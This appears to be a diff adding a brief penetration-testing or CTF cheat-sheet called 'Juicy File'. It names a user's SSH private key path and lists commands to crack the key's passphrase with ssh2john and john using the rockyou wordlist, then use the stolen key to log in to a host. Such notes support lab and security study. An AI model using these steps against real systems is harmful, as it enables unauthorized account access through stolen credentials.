@@ -1,0 +1,11 @@
+Juicy File
+/home/user01/.ssh/id_rsa
+
+# in case of password protected:
+ssh2john id_rsa > ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+
+# Before use, need to have right permissions:
+chmod 600 id_rsa
+# Then
+ssh -i id_rsa user01@10.0.0.1
